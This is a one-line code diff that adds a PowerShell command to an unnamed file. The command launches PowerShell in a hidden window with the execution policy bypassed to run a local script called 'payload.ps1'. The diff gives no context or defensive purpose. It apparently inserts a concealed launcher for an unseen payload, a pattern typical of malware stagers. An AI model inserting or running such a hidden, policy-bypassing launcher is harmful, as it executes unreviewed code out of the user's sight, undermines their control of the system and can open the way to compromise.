@@ -1,0 +1,1 @@
+Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File ".\\payload.ps1"'
